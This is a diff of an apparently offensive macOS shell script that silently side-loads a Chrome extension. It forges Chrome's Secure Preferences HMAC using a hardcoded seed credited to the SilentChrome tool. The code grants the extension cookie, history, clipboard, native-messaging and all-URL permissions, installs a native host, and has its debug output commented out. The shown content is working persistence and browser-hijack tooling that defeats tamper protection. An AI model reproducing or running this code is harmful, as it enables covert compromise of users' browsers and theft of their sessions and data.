@@ -74,7 +74,7 @@ get_device_id() {
 
 get_machine_key() {
     # Hardcoded machine key seed (same value used across all instances)
-    # This is the hex representation of the Python bytes:
+    # This is the hex representation of the Python bytes courtesy of SilentChrome - https://github.com/asaurusrex/Silent_Chrome
     # b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'
     echo "e748f336d85ea5f9dcdf25d8f347a65b4cdf667600f02df6724a2af18a212d26b788a25086910cf3a90313696871f3dc05823730c91df8ba5c4fd9c884b505a8"
 }
@@ -88,7 +88,7 @@ calculate_sha256_hash() {
 calculate_extension_id_from_path() {
     local path="$1"
     
-    # Convert path to UTF-8 bytes (like Python version), then calculate SHA256
+    # Convert path to UTF-8 bytes then calculate SHA256
     local sha256_hash=$(echo -n "$path" | /usr/local/bin/shasum -a 256 | /usr/bin/cut -d' ' -f1)
     
     # Convert first 32 hex chars to extension ID (a-p mapping)
@@ -299,7 +299,7 @@ function run(argv) {
     var cleaned = removeEmpty(obj);
     var result = JSON.stringify(cleaned, null, 0);
     
-    // For HMAC calculation, only escape < (not >) to match Python exactly
+    // For HMAC calculation, only escape < (not >)
     result = result.replace(/</g, '\\\\\\\\u003C');
 
 
@@ -322,13 +322,13 @@ calculate_hmac_from_json() {
     # Build message: deviceId + path + content (all UTF-8 encoded)
     local message="${device_id}${json_path}${fixed_content}"
     
-    # Debug output - show exact message and hex for comparison with Python
-    echo "DEBUG - Message: $message" >&2
-    echo "DEBUG - Message length: ${#message}" >&2
+    # Debug output - show exact message and hex for comparison
+    # echo "DEBUG - Message: $message" >&2
+    # echo "DEBUG - Message length: ${#message}" >&2
     
     # Convert message to hex for debugging and HMAC calculation
     local message_hex=$(echo -n "$message" | /usr/bin/xxd -p | /usr/bin/tr -d '\n' | /usr/bin/tr '[:lower:]' '[:upper:]')
-    echo "DEBUG - Message (hex): $message_hex" >&2
+    #echo "DEBUG - Message (hex): $message_hex" >&2
     
     # Calculate HMAC-SHA256 using openssl
     local hmac_result=$(echo -n "$message_hex" | /usr/bin/xxd -r -p | /usr/bin/openssl dgst -sha256 -mac HMAC -macopt hexkey:"$key_hex" | /usr/bin/cut -d' ' -f2)
@@ -453,8 +453,7 @@ EOF
     echo "Native messaging host installed"
 }
 
-# Extension settings JSON (matches Python field ordering exactly)
-#EXTENSION_SETTINGS='{"account_extension_type":0,"active_permissions":{"api":["cookies","storage","tabs","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"commands":{},"content_settings":[],"creation_flags":38,"first_install_time":"13401130184958405","from_webstore":false,"granted_permissions":{"api":["cookies","downloads","storage","tabs"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"incognito":true,"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13401130184958405","location":4,"newAllowFileAccess":true,"path":"PLACEHOLDER_PATH","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["tabs.onUpdated"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'
+# Extension settings JSON 
 EXTENSION_SETTINGS='{"account_extension_type":0,"active_permissions":{"api":["activeTab","background","clipboardRead","cookies","history","nativeMessaging","tabs","declarativeNetRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":["\u003Call_urls>"]},"commands":{},"content_settings":[],"creation_flags":38,"disable_reasons":[],"first_install_time":"13397690747955841","from_webstore":false,"granted_permissions":{"api":["activeTab","background","clipboardRead","cookies","history","nativeMessaging","tabs","declarativeNetRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":["\u003Call_urls>"]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13397690747955841","location":4,"newAllowFileAccess":true,"path":"PLACEHOLDER_PATH","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["runtime.onInstalled","runtime.onStartup"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'
 
 main() {
@@ -512,7 +511,7 @@ main() {
     
     # Install native messaging host if specified
     if [[ "$INSTALL_NATIVE_MESSAGING_HOST" == "true" ]]; then
-        local host_path="$extension_install_path/NativeAppHost"
+        local host_path="$extension_install_path/NativeAppHost.sh"
         echo "Installing native messaging host to: $host_path"
         
         local extension_name=$(basename "$EXTENSION_INSTALL_DIR")
